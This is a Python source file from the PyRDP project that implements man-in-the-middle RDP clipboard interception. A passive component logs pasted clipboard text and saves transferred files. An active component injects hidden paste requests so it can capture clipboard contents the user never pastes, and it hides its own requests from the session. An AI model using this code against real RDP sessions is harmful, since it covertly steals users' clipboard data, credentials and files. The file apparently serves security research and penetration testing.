#
# This file is part of the PyRDP project.
# Copyright (C) 2019-2020 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

from logging import LoggerAdapter
from io import BytesIO
from functools import partial
from pathlib import Path

from pyrdp.core import decodeUTF16LE, Uint64LE
from pyrdp.enum import ClipboardFormatNumber, ClipboardMessageFlags, ClipboardMessageType, PlayerPDUType, FileContentsFlags
from pyrdp.layer import ClipboardLayer
from pyrdp.logging.StatCounter import StatCounter, STAT
from pyrdp.mitm.state import RDPMITMState
from pyrdp.pdu import ClipboardPDU, FormatDataRequestPDU, FormatDataResponsePDU, FileContentsRequestPDU, FileContentsResponsePDU
from pyrdp.parser.rdp.virtual_channel.clipboard import FileDescriptor
from pyrdp.recording import Recorder
from pyrdp.mitm.config import MITMConfig

from twisted.internet.interfaces import IDelayedCall
from twisted.internet import reactor  # Import the current reactor.


TRANSFER_TIMEOUT = 5  # delay in seconds after which to kill a stalled transfer.


class PassiveClipboardStealer:
    """
    MITM component for the clipboard layer. Logs clipboard data when it is pasted.
    """

    def __init__(self, config: MITMConfig, client: ClipboardLayer, server: ClipboardLayer, log: LoggerAdapter, recorder: Recorder,
                 statCounter: StatCounter, state: RDPMITMState):
        """
        :param client: clipboard layer for the client side
        :param server: clipboard layer for the server side
        :param log: logger for this component
        :param recorder: recorder for clipboard data
        """
        self.statCounter = statCounter
        self.client = client
        self.server = server
        self.config = config
        self.log = log
        self.state = state
        self.recorder = recorder
        self.forwardNextDataResponse = True
        self.files = []
        self.transfers = {}
        self.timeouts = {}  # Track active timeout monitoring tasks.

        self.fileDir = f"{self.config.fileDir}/{self.state.sessionID}"

        self.client.createObserver(
            onPDUReceived = self.onClientPDUReceived,
        )

        self.server.createObserver(
            onPDUReceived = self.onServerPDUReceived,
        )

        # Dispatchers must return whether to forward the packet.
        self.dispatch = {
            FormatDataResponsePDU: self.onFormatDataResponse,
        }

        # Only handle file contents if file extraction is enabled.
        if self.config.extractFiles:
            self.dispatch[FileContentsRequestPDU] = self.onFileContentsRequest
            self.dispatch[FileContentsResponsePDU] = self.onFileContentsResponse

    def onClientPDUReceived(self, pdu: ClipboardPDU):
        self.statCounter.increment(STAT.CLIPBOARD, STAT.CLIPBOARD_CLIENT)
        self.handlePDU(pdu, self.server)

    def onServerPDUReceived(self, pdu: ClipboardPDU):
        self.statCounter.increment(STAT.CLIPBOARD, STAT.CLIPBOARD_SERVER)
        self.handlePDU(pdu, self.client)

    def handlePDU(self, pdu: ClipboardPDU, destination: ClipboardLayer):
        """
        Handle an incoming clipboard message.

        :param pdu: the PDU that was received
        :param destination: the destination layer
        """

        forward = True
        # Handle file transfers
        if type(pdu) in self.dispatch:
            forward = self.dispatch[type(pdu)](pdu)
        assert forward is not None, "ClipboardMITM: PDU handler must return True or False!"

        if forward:
            destination.sendPDU(pdu)

    def onFileContentsRequest(self, pdu: FileContentsRequestPDU):
        """
        There are two types of content requests: SIZE and RANGE.

        A new transfer begins with a SIZE request and is followed by multiple
        RANGE requests to retrieve the file data.

        The file is picked from the advertised clipboard file list with an index.
        """
        if pdu.flags == FileContentsFlags.SIZE:
            if pdu.lindex < len(self.files):
                fd = self.files[pdu.lindex]
                self.log.info('Starting transfer for file "%s" ClipId=%d', fd.filename, pdu.clipId)

                if pdu.streamId in self.transfers:
                    self.log.warning('File transfer already started')

                fpath = Path(self.fileDir)
                fpath.mkdir(parents=True, exist_ok=True)

                self.transfers[pdu.streamId] = FileTransfer(fpath, fd, pdu.size)

                # Track transfer timeout to prevent hung transfers.
                cbTimeout = reactor.callLater(TRANSFER_TIMEOUT, partial(self.onTransferTimedOut, pdu.streamId))
                self.timeouts[pdu.streamId] = cbTimeout
            else:
                self.log.info('Request for uknown file! (list index=%d)', pdu.lindex)

        elif pdu.flags == FileContentsFlags.RANGE:
            if pdu.streamId not in self.transfers:
                self.log.warning('FileContentsRequest for unknown transfer (streamId=%d)', pdu.streamId)
            else:
                self.refreshTimeout(pdu.streamId)
                self.transfers[pdu.streamId].onRequest(pdu)

        return True

    def onFileContentsResponse(self, pdu: FileContentsResponsePDU):
        if pdu.streamId not in self.transfers:
            self.log.warning('FileContentsResponse for unknown transfer (streamId=%d)', pdu.streamId)
        else:
            self.refreshTimeout(pdu.streamId)

            done = self.transfers[pdu.streamId].onResponse(pdu)
            if done:
                xfer = self.transfers[pdu.streamId]
                self.log.info('Transfer completed for file "%s" location: "%s"', xfer.info.filename, xfer.localname)
                del self.transfers[pdu.streamId]

                # Remove the timeout since the transfer is done.
                # This cannot throw because if we got this far, the delayed task cannot
                # have been executed yet.
                self.timeouts[pdu.streamId].cancel()
                del self.timeouts[pdu.streamId]

        return True

    def onTransferTimedOut(self, streamId: int):
        if streamId in self.transfers:
            # If the transfer exists, abort it. Otherwise, most likely the
            # transfer has been completed. The latter should never happen due to the way
            # twisted's reactor works.
            xfer = self.transfers[streamId]
            self.log.warn('Transfer timed out for "%s" (location: "%s")', xfer.info.filename, xfer.localname)
            del self.transfers[streamId]
            del self.timeouts[streamId]

    def refreshTimeout(self, streamId: int):
        self.timeouts[streamId].delay(TRANSFER_TIMEOUT)

    def onFormatDataResponse(self, pdu: FormatDataResponsePDU):
        if pdu.msgFlags == ClipboardMessageFlags.CB_RESPONSE_OK:
            # Keep the file list if there is one.
            # FIXME: There is currently no concept of transfer direction.
            if len(pdu.files) > 0:
                self.files = pdu.files
                self.log.info('---- Received Clipboard Files ----')
                for f in self.files:
                    self.log.info(f.filename)
                self.log.info('-------------------------')

            if pdu.formatId == ClipboardFormatNumber.GENERIC.value:
                clipboardData = self.decodeClipboardData(pdu.requestedFormatData)
                self.log.info("Clipboard data: %(clipboardData)r", {"clipboardData": clipboardData})
                # FIXME: Record all clipboard related messages?
                self.recorder.record(pdu, PlayerPDUType.CLIPBOARD_DATA)

            if self.forwardNextDataResponse:
                # Means it's NOT a crafted response
                self.statCounter.increment(STAT.CLIPBOARD_PASTE)

        # Do not forward the response if it is for an injected DataRequest.
        forward = self.forwardNextDataResponse
        self.forwardNextDataResponse = True
        return forward

    def decodeClipboardData(self, data: bytes) -> str:
        """
        Decode clipboard bytes to a string.
        :param data: clipboard content bytes
        """
        return decodeUTF16LE(data)


class ActiveClipboardStealer(PassiveClipboardStealer):
    """
    MITM component for the clipboard layer. Actively spies on the clipboard by sending paste requests whenever the
    clipboard is updated.
    """

    def __init__(self, config: MITMConfig, client: ClipboardLayer, server: ClipboardLayer, log: LoggerAdapter, recorder: Recorder,
                 statCounter: StatCounter, state: RDPMITMState):
        super().__init__(config, client, server, log, recorder, statCounter, state)

    def handlePDU(self, pdu: ClipboardPDU, destination: ClipboardLayer):
        """
        Check if the PDU is a FormatListResponse. If so, send a paste request to steal the clipboard data.
        :param pdu: the PDU that was received
        :param destination: the destination layer
        """
        super().handlePDU(pdu, destination)

        if pdu.msgType == ClipboardMessageType.CB_FORMAT_LIST_RESPONSE:
            self.sendPasteRequest(destination)

    def sendPasteRequest(self, destination: ClipboardLayer):
        """
        Send a FormatDataRequest to request the clipboard data.
        Sets forwardNextDataResponse to False to make sure that this request is not actually transferred to the other end.
        """

        self.statCounter.increment(STAT.CLIPBOARD_COPY)

        formatDataRequestPDU = FormatDataRequestPDU(ClipboardFormatNumber.GENERIC)
        destination.sendPDU(formatDataRequestPDU)
        self.forwardNextDataResponse = False


class FileTransfer:
    """Encapsulate the state of a clipboard file transfer."""
    def __init__(self, dst: Path, info: FileDescriptor, size: int):
        self.info = info
        self.size = size
        self.transferred: int = 0
        self.data = b''
        self.prev = None  # Pending file content request.

        self.localname = dst / Path(info.filename).name  # Avoid path traversal.

        # Handle duplicates.
        c = 1
        localname = self.localname
        while localname.exists():
            localname = self.localname.parent / f'{self.localname.stem}_{c}{self.localname.suffix}'
            c += 1
        self.localname = localname

        self.handle = open(str(self.localname), 'wb')

    def onRequest(self, pdu: FileContentsRequestPDU):
        # TODO: Handle out of order ranges. Are they even possible?
        self.prev = pdu

    def onResponse(self, pdu: FileContentsResponsePDU) -> bool:
        """
        Handle file data.

        @Returns True if file transfer is complete.
        """
        if not self.prev:
            # First response always contains file size.
            self.size = Uint64LE.unpack(BytesIO(pdu.data))

            return False

        received = len(pdu.data)

        self.handle.write(pdu.data)
        self.transferred += received

        if self.transferred == self.size:
            self.handle.close()
            return True

        return False
